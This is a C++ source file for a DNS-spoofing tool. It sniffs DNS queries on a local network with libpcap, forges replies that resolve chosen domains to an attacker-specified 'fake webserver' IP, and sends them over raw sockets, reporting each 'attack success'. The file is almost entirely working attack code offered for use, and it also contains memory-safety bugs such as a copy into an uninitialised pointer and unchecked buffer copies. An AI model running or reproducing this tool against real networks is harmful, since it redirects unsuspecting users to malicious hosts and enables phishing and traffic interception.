#include "packet_handler.hpp"

char* packet_handle::set_my_ip(char *interface_name){
    struct ifreq ifr;
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, interface_name, IFNAMSIZ - 1);
    ioctl(fd, SIOCGIFADDR, &ifr);
    close(fd);
    return inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);
}


std::vector<char*> packet_handle::set_network_interface(pcap_t *adhandle, pcap_if_t *alldevs, pcap_if_t *d, char *errbuf){
    std::vector<char*> interface_list;

    if (pcap_findalldevs(&alldevs, errbuf) < 0) {return interface_list;}

	for (d = alldevs; d; d = d->next) {
        if(d->next==NULL){break;}
        adhandle = pcap_open_live(d->name, 1000, 1, 300, errbuf);
		if (pcap_datalink(adhandle) == DLT_EN10MB && d->addresses != NULL) {
            interface_list.push_back(d->name);
		}
	}

    return interface_list;
}


int packet_handle::select_network_interface(std::vector<char*> interface_list){
    printf("┌────┬─────────────┐\n");
    printf("│ No │ interface   │\n");
    printf("├────┼─────────────┤\n");
	for (int i = 0; i < interface_list.size(); i++) {
        printf("│ %-2d │ %-10s  │\n", i+1, interface_list[i]);
	}
    printf("└────┴─────────────┘\n");

    int interface_number;
	printf("Enter the interface number you would like to sniff : ");
	scanf("%d", &interface_number);
    
    return interface_number;
}


char *packet_handle::get_interface_name(int interface_number, std::vector<char*> interface_list){
    char* interface_name;
    strcpy(interface_name, interface_list[interface_number-1]);

    return interface_name;
}


bool packet_handle::valid_interface_number(int interface_number, std::vector<char*> interface_list){
    if(interface_number > 0 && interface_number < interface_list.size()+1){
        return true;
    }else{
        return false;
    }
}


int packet_handle::start_capture_loop(char* interface_name, struct pcap_pkthdr header, const unsigned char *pkt_data, std::vector<std::string> domain_array, std::vector<std::string> ip_array, char* my_ip){
    pcap_t *adhandle;
    const char * filter = "port 53 and (udp and (udp[10] & 128 = 0))";     // Recv
    struct bpf_program fcode;
    char errbuf[PCAP_ERRBUF_SIZE];
    bpf_u_int32 mask;

    if (!(adhandle=pcap_open_live(interface_name, 65536, 1, 1000, errbuf))) {return -4;}
	if (pcap_compile(adhandle, &fcode, filter, 1, mask) == -1) {return -5;}
	if (pcap_setfilter(adhandle, &fcode) == -1) {return -6;}

    char display_intf_name[5];
    memset(display_intf_name, 0x00, sizeof(display_intf_name));
    strcpy(display_intf_name, interface_name);

    for(int i=0;i<sizeof(display_intf_name);i++){
        if(display_intf_name[i]=='\0'){
            display_intf_name[i]=' ';
        }
    }

    printf("┌───────────────────────────────────────────────────────────────────────────────────────────────────┐\n");
    printf("│            dns-spoofing: linstening on %.5s [udp dst port 53 and not src %15s]        │\n", display_intf_name, my_ip);
    printf("├────┬─────────────────┬───────┬─────────────────┬───────┬───────────┬────────┬───┬─────────────────┤\n");
    printf("│Info│    source ip    │ sport │ destination ip  │ dport │ Data size │   ID   │Q&A│   information   │\n");
    printf("└────┴─────────────────┴───────┴─────────────────┴───────┴───────────┴────────┴───┴─────────────────┘");
    fflush(stdout);

    while (1) {
        if ((pkt_data = pcap_next(adhandle, &(header))) != NULL) {
            char *extract_domain = make_domain(header, pkt_data);
            int full_packet_size = packet_handler(header, pkt_data, extract_domain, domain_array, ip_array, my_ip);
        }
    }

    return 0;
}


void packet_handle::print_attack_success(struct pcap_pkthdr header, const unsigned char *pkt_data, char *extract_domain, char *fake_webserver_ip, char* my_ip, int full_size){
    ether_header *eth = (ether_header*)(pkt_data);
    ip_header *ip = (ip_header *)(pkt_data + sizeof(ether_header));
    udp_header *udp = (udp_header *)(pkt_data + sizeof(ether_header) + sizeof(ip_header));
    dns_header *dns = (dns_header *)(pkt_data + 42);
    
    char display_domain[1024];
    char source_ip[16];
    char dest_ip[16];

    int sport = ntohs(udp->sport);
    int dport = ntohs(udp->dport);
    int dns_id = ntohs(dns->ID);

    memset(display_domain, 0x00, 1024);
    memcpy(display_domain, extract_domain, strlen(extract_domain));
    
    if(strlen(display_domain)>16){
        memset(display_domain+12, '.', 3);
        memset(display_domain+15, 0x00, strlen(display_domain));
    }
    
    snprintf(source_ip, sizeof(source_ip), "%d.%d.%d.%d", ip->saddr.byte1, ip->saddr.byte2, ip->saddr.byte3, ip->saddr.byte4);
    snprintf(dest_ip, sizeof(dest_ip), "%d.%d.%d.%d", ip->daddr.byte1, ip->daddr.byte2, ip->daddr.byte3, ip->daddr.byte4);

    int sizeof_outter_box = 101;
    for (int j = 0; j < sizeof_outter_box ; j++) {
        printf("\b \b");
    }
    printf("├────┼─────────────────┼───────┼─────────────────┼───────┼───────────┼────────┼───┼─────────────────┤\n");
    printf("│Recv│ %-16s│ %-5d │ %-16s│ %-5d │ %3d Bytes │ 0x%-4x │ Q │ %-16s│\n", source_ip, sport, dest_ip, dport, header.caplen,dns_id, display_domain);
    printf("│Send│ %-16s│ %-5d │ %-16s│ %-5d │ %3d Bytes │ 0x%-4x │ A │ %-16s│\n", my_ip, dport, source_ip, sport, full_size, dns_id, fake_webserver_ip);
    printf("└────┴─────────────────┴───────┴─────────────────┴───────┴───────────┴────────┴───┴─────────────────┘");
    fflush(stdout);
}


int packet_handle::packet_handler(struct pcap_pkthdr header, const unsigned char *pkt_data, char *extract_domain, std::vector<std::string> domain_array, std::vector<std::string> ip_addr_array, char* my_ip) {
    ether_header *eth = (ether_header*)(pkt_data);
    ip_header *ip = (ip_header *)(pkt_data + sizeof(ether_header));
    udp_header *udp = (udp_header *)(pkt_data + sizeof(ether_header) + sizeof(ip_header));
    dns_header *dns = (dns_header *)(pkt_data + 42);
    
    if(compare_domain(extract_domain, domain_array)){
        unsigned char dns_response[1024];
        unsigned char *dns_reply_hdr;
        char fake_webserver_ip[16];
        int full_size;

        memset(dns_response, 0x00, 1024);
        dns_reply_hdr = dns_response + sizeof(ip_header) + sizeof(udp_header);

        dns_reply_hdr[0]=dns->ID & 0xff; dns_reply_hdr[1]=(dns->ID >> 8) & 0xff;
        dns_reply_hdr[2]=0x81; dns_reply_hdr[3]=0x80;
        dns_reply_hdr[4]=dns->QDCNT & 0xff; dns_reply_hdr[5]=(dns->QDCNT >> 8) & 0xff;
        dns_reply_hdr[6]=0x00; dns_reply_hdr[7]=0x01;
        dns_reply_hdr[8]=dns->NSCNT & 0xff; dns_reply_hdr[9]=(dns->NSCNT >> 8) & 0xff;
        dns_reply_hdr[10]=dns->ARCNT & 0xff; dns_reply_hdr[11]=(dns->ARCNT >> 8) & 0xff;
    
        int size = header.caplen-54-4;

        for(int i=0;i<size;i++){
            dns_reply_hdr[12+i]=pkt_data[i+54];
        }

        dns_reply_hdr[size+12]=0x00; dns_reply_hdr[size+13]=0x01; 
        dns_reply_hdr[size+14]=0x00; dns_reply_hdr[size+15]=0x01; 
        dns_reply_hdr[size+16]=0xc0; dns_reply_hdr[size+17]=0x0c;
        dns_reply_hdr[size+18]=0x00; dns_reply_hdr[size+19]=0x01;
        dns_reply_hdr[size+20]=0x00; dns_reply_hdr[size+21]=0x01;
        dns_reply_hdr[size+22]=0x00; dns_reply_hdr[size+23]=0x00;
        dns_reply_hdr[size+24]=0x00; dns_reply_hdr[size+25]=0x34;
        dns_reply_hdr[size+26]=0x00; dns_reply_hdr[size+27]=0x04;

        for(int i=0;i<domain_array.size();i++){
            if(strcmp(extract_domain, domain_array[i].c_str())==0){
                strcpy(fake_webserver_ip,ip_addr_array[i].c_str());
            }
        }

        unsigned char ip_in_hex[4];
        sscanf(fake_webserver_ip, "%d.%d.%d.%d",(int *)&ip_in_hex[0],(int *)&ip_in_hex[1], (int *)&ip_in_hex[2], (int *)&ip_in_hex[3]); //copy arg to int array
        memcpy(&dns_reply_hdr[size+28], ip_in_hex, 4);

        full_size = size+32;
        
        ip->tlen = htons(sizeof(ip_header) + sizeof(udp_header) + full_size);
        ip_address temp = ip->daddr;
        ip->daddr = ip->saddr;
        ip->saddr = temp;
        
        int temp_port = udp->sport;
        udp->sport = htons(53);
        udp->dport = temp_port;
        udp->len = htons(sizeof(udp_header) + full_size);
        udp->crc = 0;

        memcpy(&dns_response[0], (char *)ip, sizeof(ip_header));
        memcpy(&dns_response[sizeof(ip_header)], (char *)udp, sizeof(udp_header));

        char target_ip[16];
        snprintf(target_ip, sizeof(target_ip), "%d.%d.%d.%d", ip->daddr.byte1, ip->daddr.byte2, ip->daddr.byte3, ip->daddr.byte4);
        full_size = full_size + (sizeof(ip_header) + sizeof(udp_header));

        if(sned_dns_packet(target_ip, udp->dport, dns_response, full_size)>0){
            print_attack_success(header, pkt_data, extract_domain, fake_webserver_ip, my_ip, full_size);
        }
    }
}


char* packet_handle::make_domain(struct pcap_pkthdr header, const unsigned char *pkt_data){
    char* extract_domain = (char*)malloc(sizeof(char)*1024);
    memset(extract_domain, 0x00, 1024);
    char dns_data[1024];
    memset(dns_data, 0x00, 1024);

    for(int i=0;i<header.caplen;i++){
        dns_data[i] = (unsigned int)pkt_data[i+54];
    }

    int size_before_dot = dns_data[0], index = 0, size_index = 1;

    while(size_before_dot > 0) {
        for(int i=0;i<size_before_dot;i++){
            extract_domain[index++] = dns_data[i+size_index];
        }
        extract_domain[index++]='.';
        size_index+=size_before_dot;
        size_before_dot = dns_data[size_index++];
    }

    extract_domain[--index]='\0';

    return extract_domain;
}


int packet_handle::sned_dns_packet(char *target_ip, int port, unsigned char *dns_packet,int size){
    struct sockaddr_in serv_addr;
    int tmp=1, sfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);

    inet_pton(AF_INET, target_ip, &(serv_addr.sin_addr));

    if (setsockopt(sfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof(tmp)) < 0) {
        printf("ERROR: setsockopt hdrincl not work\n");
        return -1;
    };

    if (sendto(sfd, dns_packet, size, 0, (struct sockaddr *)&serv_addr, sizeof(serv_addr))<0) {
        printf("ERROR: can't sending UDP\n");
        return -1;
    }

    close(sfd);
    return 1;
}


bool packet_handle::compare_domain(const char *target_domain, std::vector<std::string> domain_list){
    for(int i=0;i<domain_list.size();i++){
        if(strcmp(target_domain, "")!=0 && strcmp(target_domain, domain_list[i].c_str())==0){
            return true;
        }
    }

    return false;
}